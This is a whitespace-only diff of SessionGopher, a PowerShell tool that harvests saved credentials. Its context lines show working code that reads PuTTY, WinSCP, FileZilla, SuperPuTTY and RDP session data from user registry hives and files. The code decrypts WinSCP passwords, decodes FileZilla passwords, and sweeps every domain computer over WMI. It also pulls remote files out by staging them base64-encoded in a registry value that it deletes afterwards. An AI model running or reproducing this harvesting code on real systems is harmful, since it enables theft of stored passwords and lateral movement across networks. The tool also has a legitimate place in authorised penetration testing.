@@ -12,13 +12,13 @@
 
   .Notes
   Author: Brandon Arvanaghi
-  Thanks: 
+  Thanks:
     Brice Daniels, Pan Chan - collaborating on idea
     Christopher Truncer - helping with WMI
 
   .PARAMETER o
   Generates CSV output.
-    
+
   .PARAMETER Thorough
   Searches entire filesystem for certain file extensions.
 
@@ -27,13 +27,13 @@
 
   .PARAMETER p
   Password for domain user (if username provided).
-    
+
   .PARAMETER iL
   If you want to supply a list of hosts to run SessionGopher against, provide the path to that file here. Each host should be separated by a newline in the file.
 
   .PARAMETER Target
   If you only want to run SessionGopher against once specific host.
-    
+
   .PARAMETER AllDomain
   Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them.
 #>
@@ -49,10 +49,10 @@ function Invoke-SessionGopher {
   )
 
   Write-Output '
-          o_       
-         /  ".   SessionGopher - RDP, WinSCP, FileZilla, PuTTY, SuperPuTTY, 
+          o_
+         /  ".   SessionGopher - RDP, WinSCP, FileZilla, PuTTY, SuperPuTTY,
        ,"  _-"      .sdtid, .rdp, .ppk saved session & password extractor
-     ,"   m m         
+     ,"   m m
   ..+     )      Brandon Arvanaghi
      `m..m       Twitter: @arvanaghi | arvanaghi.com
   '
@@ -93,7 +93,7 @@ function Invoke-SessionGopher {
 
     if ($AllDomain) {
       $Reader = GetComputersFromActiveDirectory
-    } elseif ($iL) { 
+    } elseif ($iL) {
       $Reader = Get-Content ((Resolve-Path $iL).Path)
     } elseif ($Target) {
       $Reader = $Target
@@ -122,7 +122,7 @@ function Invoke-SessionGopher {
         $MappedUserName = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
         $Source = (($RemoteComputer + "\" + $MappedUserName) -Join "")
 
-        # Created for each user found. Contains all sessions information for that user. 
+        # Created for each user found. Contains all sessions information for that user.
         $UserObject = New-Object PSObject
 
         <#
@@ -156,9 +156,9 @@ function Invoke-SessionGopher {
 
           # Get all sessions
           $WinSCPSessions = $WinSCPSessions | Select-Object -ExpandProperty sNames
-          
+
           foreach ($WinSCPSession in $WinSCPSessions) {
-      
+
             $WinSCPSessionObject = "" | Select-Object -Property Source,Session,Hostname,Username,Password
             $WinSCPSessionObject.Source = $Source
             $WinSCPSessionObject.Session = $WinSCPSession
@@ -172,9 +172,9 @@ function Invoke-SessionGopher {
             if ($WinSCPSessionObject.Password) {
 
               $MasterPassPath = $SID + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
-          
+
               $MasterPassUsed = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$MasterPassPath,"UseMasterPassword" @optionalCreds).uValue
-              
+
               if (!$MasterPassUsed) {
                   $WinSCPSessionObject.Password = (DecryptWinSCPPassword $WinSCPSessionObject.Hostname $WinSCPSessionObject.Username $WinSCPSessionObject.Password)
               } else {
@@ -182,9 +182,9 @@ function Invoke-SessionGopher {
               }
 
             }
-             
+
             [void]$ArrayOfWinSCPSessions.Add($WinSCPSessionObject)
-      
+
           } # For Each WinSCP Session
 
           if ($ArrayOfWinSCPSessions.count -gt 0) {
@@ -199,7 +199,7 @@ function Invoke-SessionGopher {
             }
 
           }
-        
+
         } # If path to WinSCP exists
 
         if (($PuTTYSessions | Select-Object -ExpandPropert ReturnValue) -eq 0) {
@@ -208,7 +208,7 @@ function Invoke-SessionGopher {
           $PuTTYSessions = $PuTTYSessions | Select-Object -ExpandProperty sNames
 
           foreach ($PuTTYSession in $PuTTYSessions) {
-      
+
             $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname
 
             $Location = $PuTTYPath + "\" + $PuTTYSession
@@ -216,9 +216,9 @@ function Invoke-SessionGopher {
             $PuTTYSessionObject.Source = $Source
             $PuTTYSessionObject.Session = $PuTTYSession
             $PuTTYSessionObject.Hostname = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName" @optionalCreds).sValue
-             
+
             [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)
-      
+
           }
 
           if ($ArrayOfPuTTYSessions.count -gt 0) {
@@ -242,9 +242,9 @@ function Invoke-SessionGopher {
           $RDPSessions = $RDPSessions | Select-Object -ExpandProperty sNames
 
           foreach ($RDPSession in $RDPSessions) {
-      
+
             $RDPSessionObject = "" | Select-Object -Property Source,Hostname,Username
-            
+
             $Location = $RDPPath + "\" + $RDPSession
 
             $RDPSessionObject.Source = $Source
@@ -252,7 +252,7 @@ function Invoke-SessionGopher {
             $RDPSessionObject.Username = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserNameHint" @optionalCreds).sValue
 
             [void]$ArrayOfRDPSessions.Add($RDPSessionObject)
-      
+
           }
 
           if ($ArrayOfRDPSessions.count -gt 0) {
@@ -303,14 +303,14 @@ function Invoke-SessionGopher {
         $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $RemoteComputer @optionalCreds | Select Name)
 
         (ProcessThoroughRemote $FilePathsFound)
-        
-      } 
+
+      }
 
     } # for each remote computer
 
   # Else, we run SessionGopher locally
-  } else { 
-    
+  } else {
+
     Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
     Write-Host "Digging on"(Hostname)"..."
 
@@ -320,7 +320,7 @@ function Invoke-SessionGopher {
     # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
     foreach($Hive in $UserHives) {
 
-      # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information. 
+      # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information.
       $UserObject = New-Object PSObject
 
       $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
@@ -374,7 +374,7 @@ function Invoke-SessionGopher {
         (ProcessWinSCPLocal $AllWinSCPSessions)
 
       } # If (Test-Path WinSCPPath)
-      
+
       if (Test-Path $PuTTYPath) {
 
         # Aggregates all saved sessions from that user's PuTTY client
@@ -398,7 +398,7 @@ function Invoke-SessionGopher {
       $AllDrives = Get-PSDrive
 
       (ProcessThoroughLocal $AllDrives)
-      
+
       (ProcessPPKFile $PPKExtensionFilesINodes)
       (ProcessRDPFile $RDPExtensionFilesINodes)
       (ProcesssdtidFile $sdtidExtensionFilesINodes)
@@ -441,7 +441,7 @@ function DownloadAndExtractFromRemoteRegistry($File) {
   $fullregistrypath = "HKLM:\Software\Microsoft\DRM"
   $registrydownname = "ReadMe"
   $regpath = "SOFTWARE\Microsoft\DRM"
-          
+
   # On remote system, save file to registry
   Write-Verbose "Reading remote file and writing on remote registry"
   $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
@@ -456,13 +456,13 @@ function DownloadAndExtractFromRemoteRegistry($File) {
 
   # Grab file from remote system's registry
   $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM, $regpath, $registrydownname -Computer $RemoteComputer @optionalCreds
-  
+
   $decoded = [System.Convert]::FromBase64String($remote_reg.sValue)
-  $UTF8decoded = [System.Text.Encoding]::UTF8.GetString($decoded) 
-    
+  $UTF8decoded = [System.Text.Encoding]::UTF8.GetString($decoded)
+
   # Removing Registry value from remote system
   $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $RemoteComputer @optionalCreds
-  
+
   return $UTF8decoded
 
 }
@@ -474,7 +474,7 @@ function DownloadAndExtractFromRemoteRegistry($File) {
 ####################################################################################
 
 function ProcessThoroughLocal($AllDrives) {
-  
+
   foreach ($Drive in $AllDrives) {
     # If the drive holds a filesystem
     if ($Drive.Provider.Name -eq "FileSystem") {
@@ -552,8 +552,8 @@ function ProcessThoroughRemote($FilePathsFound) {
 } # ProcessThoroughRemote
 
 function ProcessPuTTYLocal($AllPuTTYSessions) {
-  
-  # For each PuTTY saved session, extract the information we want 
+
+  # For each PuTTY saved session, extract the information we want
   foreach($Session in $AllPuTTYSessions) {
 
     $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname
@@ -610,7 +610,7 @@ function ProcessRDPLocal($AllRDPSessions) {
 } #ProcessRDPLocal
 
 function ProcessWinSCPLocal($AllWinSCPSessions) {
-  
+
   # For each WinSCP saved session, extract the information we want
   foreach($Session in $AllWinSCPSessions) {
 
@@ -682,16 +682,16 @@ function ProcesssdtidFile($sdtidExtensionFilesINodes) {
 } # Process sdtid File
 
 function ProcessRDPFile($RDPExtensionFilesINodes) {
-  
+
   # Extracting the filepath from the i-node information stored in RDPExtensionFilesINodes
   foreach ($Path in $RDPExtensionFilesINodes.VersionInfo.FileName) {
-    
+
     $RDPFileObject = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"
 
     $RDPFileObject."Source" = (Hostname)
 
     # The next several lines use regex pattern matching to store relevant info from the .rdp file into our object
-    $RDPFileObject."Path" = $Path 
+    $RDPFileObject."Path" = $Path
     $RDPFileObject."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
     $RDPFileObject."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
     $RDPFileObject."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
@@ -786,16 +786,16 @@ function ProcessFileZillaFile($FileZillaXML) {
                   # Populate session data based on the node name
                   $FileZillaSessionHash[$_.Name] = $_.InnerText
               }
-              
+
           }
 
       }
 
     # Create object from collected data, excluding some trivial information
     [void]$ArrayOfFileZillaSessions.Add((New-Object PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
-     
+
   } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
-  
+
   # base64_decode the stored encoded session passwords, and decode protocol
   foreach ($Session in $ArrayOfFileZillaSessions) {
       $Session.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Session.Password))
@@ -809,7 +809,7 @@ function ProcessFileZillaFile($FileZillaXML) {
         $Session.Protocol = "Require explicit FTP over TLS"
       } elseif ($Session.Protocol -eq 6) {
         $Session.Protocol = "Only use plain FTP (insecure)"
-      } 
+      }
   }
 
   if ($o) {
@@ -828,7 +828,7 @@ function ProcessSuperPuTTYFile($SuperPuTTYXML) {
 
   foreach($SuperPuTTYSessions in $SuperPuTTYXML.ArrayOfSessionData.SessionData) {
 
-    foreach ($SuperPuTTYSession in $SuperPuTTYSessions) { 
+    foreach ($SuperPuTTYSession in $SuperPuTTYSessions) {
       if ($SuperPuTTYSession -ne $null) {
 
         $SuperPuTTYSessionObject = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"
@@ -843,7 +843,7 @@ function ProcessSuperPuTTYFile($SuperPuTTYXML) {
         $SuperPuTTYSessionObject."PuTTY Session" = $SuperPuTTYSession.PuttySession
 
         [void]$ArrayOfSuperPuTTYSessions.Add($SuperPuTTYSessionObject)
-      } 
+      }
     }
 
   } # ForEach SuperPuTTYSessions
@@ -912,7 +912,7 @@ function DecryptWinSCPPassword($SessionHostname, $SessionUsername, $Password) {
   $key =  $SessionHostname + $SessionUsername
   $values = DecryptNextCharacterWinSCP($Password)
 
-  $storedFlag = $values.flag 
+  $storedFlag = $values.flag
 
   if ($values.flag -eq $CheckFlag) {
     $values.remainingPass = $values.remainingPass.Substring(2)
